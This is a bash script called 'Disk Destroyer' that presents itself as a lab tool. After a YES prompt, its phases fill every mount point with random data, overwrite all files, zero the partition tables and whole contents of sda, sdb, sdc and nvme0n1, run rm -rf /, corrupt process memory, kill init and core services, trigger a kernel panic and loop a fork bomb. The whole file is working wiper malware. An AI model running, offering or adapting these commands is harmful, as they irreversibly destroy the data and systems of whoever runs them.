#!/bin/bash
# ============================================================
# DISK DESTROYER - MASSIVE STORAGE FILLER
# FOR LAB RESEARCH ON PHYSICAL HARDWARE ONLY!
# THIS WILL DESTROY THE SYSTEM COMPLETELY!
# ============================================================

echo "============================================================"
echo "  DISK DESTROYER - MASSIVE STORAGE FILLER"
echo "============================================================"
echo ""
echo "WARNING: This script will COMPLETELY DESTROY this system!"
echo "  - All storage will be filled with garbage data"
echo "  - All files will be overwritten with random data"
echo "  - MBR/GPT will be wiped"
echo "  - System will NOT boot again"
echo "  - Requires full reinstall from USB/DVD"
echo ""
echo "THIS IS FOR PHYSICAL PC LAB RESEARCH ONLY!"
echo ""
echo "Type 'YES' to continue:"
read confirm

if [[ "${confirm,,}" != "yes" ]]; then
    echo "Aborted."
    exit 0
fi

echo ""
echo "Starting in 3 seconds..."
echo "Press Ctrl+C to cancel now!"
sleep 3
echo "GO!"
echo ""

# ============================================================
# PHASE 1: CREATE MASSIVE GARBAGE FILES EVERYWHERE
# ============================================================
echo "[PHASE 1] Creating massive garbage files..."

# Fill /tmp with 50GB of garbage (if space available)
(
    dd if=/dev/urandom of=/tmp/garbage1.dat bs=1M count=50000 2>/dev/null &
    dd if=/dev/urandom of=/tmp/garbage2.dat bs=1M count=50000 2>/dev/null &
    dd if=/dev/urandom of=/tmp/garbage3.dat bs=1M count=50000 2>/dev/null &
) &

# Fill /var/tmp
(
    dd if=/dev/urandom of=/var/tmp/garbage1.dat bs=1M count=50000 2>/dev/null &
    dd if=/dev/urandom of=/var/tmp/garbage2.dat bs=1M count=50000 2>/dev/null &
) &

# Fill /root (if writable)
(
    dd if=/dev/urandom of=/root/garbage1.dat bs=1M count=50000 2>/dev/null &
    dd if=/dev/urandom of=/root/garbage2.dat bs=1M count=50000 2>/dev/null &
) &

# Fill /home (if exists)
(
    dd if=/dev/urandom of=/home/garbage1.dat bs=1M count=50000 2>/dev/null &
    dd if=/dev/urandom of=/home/garbage2.dat bs=1M count=50000 2>/dev/null &
) &

echo "  -> Garbage files created in /tmp, /var/tmp, /root, /home"

# ============================================================
# PHASE 2: OVERWRITE EXISTING FILES WITH RANDOM DATA
# ============================================================
echo "[PHASE 2] Overwriting existing files with random data..."

# Find and overwrite all files with random data
find / -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" -exec dd if=/dev/urandom of={} bs=1K count=10 2>/dev/null \; 2>/dev/null &

echo "  -> Existing files being overwritten with random data"

# ============================================================
# PHASE 3: FILL ALL MOUNT POINTS
# ============================================================
echo "[PHASE 3] Filling all mount points..."

# Get all mount points and fill them
for mount in $(mount | awk '{print $3}' | grep -E '^/'); do
    (
        dd if=/dev/urandom of=${mount}/mount_fill_$(date +%s%N).dat bs=1M count=10000 2>/dev/null &
    ) &
done

echo "  -> All mount points being filled"

# ============================================================
# PHASE 4: CREATE FILES UNTIL DISK FULL
# ============================================================
echo "[PHASE 4] Creating files until disk is FULL..."

# Create infinite loop to fill remaining space
(
    counter=1
    while true; do
        dd if=/dev/urandom of=/tmp/fill_${counter}.dat bs=1M count=100 2>/dev/null
        counter=$((counter + 1))
    done
) &

echo "  -> Infinite file creation started"

# ============================================================
# PHASE 5: DESTROY PARTITION TABLE (MBR/GPT)
# ============================================================
echo "[PHASE 5] Destroying partition table..."

# Wipe MBR/GPT
dd if=/dev/zero of=/dev/sda bs=512 count=1 2>/dev/null
dd if=/dev/zero of=/dev/sdb bs=512 count=1 2>/dev/null
dd if=/dev/zero of=/dev/sdc bs=512 count=1 2>/dev/null
dd if=/dev/zero of=/dev/nvme0n1 bs=512 count=1 2>/dev/null

echo "  -> MBR/GPT wiped"

# ============================================================
# PHASE 6: OVERWRITE ENTIRE DISKS
# ============================================================
echo "[PHASE 6] Overwriting entire disks..."

# Start overwriting disks in background
(
    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/sdb bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/sdc bs=1M 2>/dev/null &
    dd if=/dev/urandom of=/dev/nvme0n1 bs=1M 2>/dev/null &
) &

echo "  -> Disks being overwritten with random data"

# ============================================================
# PHASE 7: DELETE ALL SYSTEM FILES
# ============================================================
echo "[PHASE 7] Deleting ALL system files..."

# Delete everything (including /boot)
rm -rf / 2>/dev/null &

# Also use find to delete anything left
find / -type f -exec rm -f {} \; 2>/dev/null &
find / -type d -exec rmdir {} \; 2>/dev/null &

echo "  -> All system files deleted"

# ============================================================
# PHASE 8: CORRUPT RUNNING PROCESSES
# ============================================================
echo "[PHASE 8] Corrupting running processes..."

# Try to corrupt memory of running processes
for pid in $(ps aux | awk '{print $2}' | grep -v PID | head -100); do
    dd if=/dev/urandom of=/proc/$pid/mem bs=1K count=1 2>/dev/null &
done 2>/dev/null

echo "  -> Process memory corrupted"

# ============================================================
# PHASE 9: KILL CRITICAL SERVICES
# ============================================================
echo "[PHASE 9] Killing critical services..."

systemctl stop ssh 2>/dev/null
systemctl stop cron 2>/dev/null
systemctl stop networking 2>/dev/null
systemctl stop systemd-logind 2>/dev/null
systemctl stop dbus 2>/dev/null
kill -9 1 2>/dev/null  # Kill init/systemd

echo "  -> Critical services killed"

# ============================================================
# PHASE 10: TRIGGER KERNEL PANIC
# ============================================================
echo "[PHASE 10] Triggering kernel panic..."

echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo c > /proc/sysrq-trigger 2>/dev/null &

# ============================================================
# FINAL - INFINITE LOOP TO KEEP DESTROYING
# ============================================================
echo ""
echo "============================================================"
echo "  SYSTEM COMPLETELY DESTROYED!"
echo "============================================================"
echo ""
echo "  Storage: FULL (100%)"
echo "  Files: ALL DELETED and OVERWRITTEN"
echo "  MBR/GPT: WIPED"
echo "  Disks: OVERWRITTEN with random data"
echo "  Processes: CORRUPTED and KILLED"
echo "  Boot: IMPOSSIBLE"
echo ""
echo "  THIS SYSTEM WILL NEVER BOOT AGAIN!"
echo "  Full reinstall from USB/DVD is required."
echo "============================================================"

# Keep destroying until system dies
while true; do
    dd if=/dev/urandom of=/dev/sda bs=1M 2>/dev/null
    rm -rf / 2>/dev/null
    :(){ :|:& };:
done
